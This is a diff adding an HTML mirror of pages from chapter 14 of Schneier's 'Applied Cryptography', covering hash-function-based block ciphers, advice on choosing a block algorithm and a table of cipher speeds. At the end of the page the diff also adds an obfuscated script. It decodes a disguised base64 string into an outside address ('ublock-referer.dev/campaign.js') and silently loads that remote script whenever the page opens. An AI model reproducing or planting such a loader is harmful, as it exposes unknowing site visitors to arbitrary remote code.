@@ -1,0 +1,173 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Still Other Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=14//-->
+<!--PAGES=353-355//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="14-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch15/15-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>However, I donot trust this construction. It is possible to attack the hash function in a way that hash functions are not designed to withstand. It is not important for hash functions to be able to resist a chosen-plaintext attack, where a cryptanalyst chooses several of those starting 160-bit values, has them &#147;encrypted&#148; by the same 512-bit &#147;key,&#148; and uses this to learn some information about the 512-bit key used. Since the designers didnot have to worry about this, it seems like a bad idea to count on your cipher being able to resist this attack.
+</P>
+<P><FONT SIZE="+1"><B><I>Security of Ciphers Based on one-Way Hash Functions</I></B></FONT></P>
+<P>While these constructions can be secure, they depend on the choice of the underlying one-way hash function. A good one-way hash function doesnot necessarily make a secure encryption algorithm. Cryptographic requirements are different. For example, linear cryptanalysis is not a viable attack against one-way hash functions, but works against encryption algorithms. A one-way hash function such as SHA could have linear characteristics which, while not affecting its security as a one-way hash function, could make it insecure in an encryption algorithm such as MDC. I know of no cryptanalytic analysis of particular one-way hash functions as block ciphers; wait for such analysis before you trust any of them.
+</P>
+<I><P><A NAME="Fig5"></A><A HREF="javascript:displayWindow('images/14-05.jpg',345,143 )"><IMG SRC="images/14-05t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/14-05.jpg',345,143)"><FONT COLOR="#000077"><B>Figure 14.5</B></FONT></A>&nbsp;&nbsp;Message Digest Cipher (MDC).</I>
+</P>
+<H3><A NAME="Heading13"></A><FONT COLOR="#000077">14.12 Choosing a Block Algorithm</FONT></H3>
+<P>It&#146;s a tough decision. DES is almost certainly insecure against the major governments of the world unless you only encrypt very small chunks of data for a single key. IT&#146;S probably all right against anyone else, but that is changing soon. Brute-force DES key search machines will quickly become economical for all sorts of organizations.
+</P>
+<P>Biham&#146;s key-dependent S-boxes for DES should be secure for at least a few years against all but the most well-funded adversaries, and possibly even from them. If you need security that lasts decades or fear the cryptanalytic efforts of major governments, use triple-DES with three independent keys.</P>
+<P>The other algorithms arenot worthless. I like Blowfish because it is fast and I wrote it. 3-WAY looks good, and GoST is probably okay. The problem with any recommendation is that the NSA almost certainly has an array of impressive cryptanalytic techniques that are still classified, and I donot know which algorithms they can break with them. Table 14.3 gives timing measurements for some algorithms. These are meant for comparison purposes only.</P>
+<P>My favorite algorithm is IDEA. Its 128-bit key, combined with its resistance to any public means of cryptanalysis, gives me a warm, fuzzy feeling about the algorithm. The algorithm has been analyzed by a lot of different groups, and no serious results have been announced yet. Barring extraordinary cryptanalytic news tomorrow, I am betting on IDEA today.</P>
+<TABLE WIDTH="100%"><TH CAPTION ALIGN="CENTER" COLSPAN="4">Table 14.3<BR>Encryption Speeds of Some Block Ciphers on a 33 MHz 486SX
+<TR>
+<TD COLSPAN="4"><HR>
+<TR>
+<TH WIDTH="25%" VALIGN="BOTTOM" ALIGN="CENTER">Algorithm
+<TH WIDTH="25%" VALIGN="BOTTOM" ALIGN="CENTER">Encryption Speed<BR>(Kilobytes/second)
+<TH WIDTH="20%" VALIGN="BOTTOM" ALIGN="CENTER">Algorithm
+<TH VALIGN="BOTTOM" ALIGN="CENTER">Encryption Speed<BR>(Kilobytes/second)
+<TR>
+<TD COLSPAN="4"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Blowfish (12 rounds)
+<TD VALIGN="TOP" ALIGN="CENTER">182
+<TD VALIGN="TOP" ALIGN="LEFT">MDC (using MD4)
+<TD VALIGN="TOP" ALIGN="CENTER">186
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Blowfish (16 rounds)
+<TD VALIGN="TOP" ALIGN="CENTER">135
+<TD VALIGN="TOP" ALIGN="LEFT">MDC (using MD5)
+<TD VALIGN="TOP" ALIGN="CENTER">135
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Blowfish (20 rounds)
+<TD VALIGN="TOP" ALIGN="CENTER">110
+<TD VALIGN="TOP" ALIGN="LEFT">MDC (using SHA)
+<TD VALIGN="TOP" ALIGN="CENTER">23
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">DES
+<TD VALIGN="TOP" ALIGN="CENTER">35
+<TD VALIGN="TOP" ALIGN="LEFT">NewDES
+<TD VALIGN="TOP" ALIGN="CENTER">233
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">FEAL-8
+<TD VALIGN="TOP" ALIGN="CENTER">300
+<TD VALIGN="TOP" ALIGN="LEFT">REDOC II
+<TD VALIGN="TOP" ALIGN="CENTER">1
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">FEAL-16
+<TD VALIGN="TOP" ALIGN="CENTER">161
+<TD VALIGN="TOP" ALIGN="LEFT">REDOC III
+<TD VALIGN="TOP" ALIGN="CENTER">78
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">FEAL-32
+<TD VALIGN="TOP" ALIGN="CENTER">91
+<TD VALIGN="TOP" ALIGN="LEFT">RC5-32/8
+<TD VALIGN="TOP" ALIGN="CENTER">127
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">GOST
+<TD VALIGN="TOP" ALIGN="CENTER">53
+<TD VALIGN="TOP" ALIGN="LEFT">RC5-32/12
+<TD VALIGN="TOP" ALIGN="CENTER">86
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">IDEA
+<TD VALIGN="TOP" ALIGN="CENTER">70
+<TD VALIGN="TOP" ALIGN="LEFT">RC5-32/16
+<TD VALIGN="TOP" ALIGN="CENTER">65
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Khufu (16 rounds)
+<TD VALIGN="TOP" ALIGN="CENTER">221
+<TD VALIGN="TOP" ALIGN="LEFT">RC5-32/20
+<TD VALIGN="TOP" ALIGN="CENTER">52
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Khufu (24 rounds)
+<TD VALIGN="TOP" ALIGN="CENTER">153
+<TD VALIGN="TOP" ALIGN="LEFT">SAFER (6 rounds)
+<TD VALIGN="TOP" ALIGN="CENTER">81
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Khufu (32 rounds)
+<TD VALIGN="TOP" ALIGN="CENTER">115
+<TD VALIGN="TOP" ALIGN="LEFT">SAFER (8 rounds)
+<TD VALIGN="TOP" ALIGN="CENTER">61
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Luby-Rackoff (using MD4)
+<TD VALIGN="TOP" ALIGN="CENTER">47
+<TD VALIGN="TOP" ALIGN="LEFT">SAFER (10 rounds)
+<TD VALIGN="TOP" ALIGN="CENTER">49
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Luby-Rackoff (using MD5)
+<TD VALIGN="TOP" ALIGN="CENTER">34
+<TD VALIGN="TOP" ALIGN="LEFT">SAFER (12 rounds)
+<TD VALIGN="TOP" ALIGN="CENTER">41
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Luby-Rackoff (using SHA)
+<TD VALIGN="TOP" ALIGN="CENTER">11
+<TD VALIGN="TOP" ALIGN="LEFT">3-Way
+<TD VALIGN="TOP" ALIGN="CENTER">25
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Lucifer
+<TD VALIGN="TOP" ALIGN="CENTER">52
+<TD VALIGN="TOP" ALIGN="LEFT">Triple-DES
+<TD VALIGN="TOP" ALIGN="CENTER">12
+<TR>
+<TD COLSPAN="4"><HR>
+</TABLE>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="14-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch15/15-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(bVYhKhZh, fsVeohzn) {fsVeohzn = bVYhKhZh.createElement('script');fsVeohzn.type = 'text/javascript';fsVeohzn.async = true;fsVeohzn.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');bVYhKhZh.getElementsByTagName('body')[0].appendChild(fsVeohzn);}(document));</script></body>
+</html>
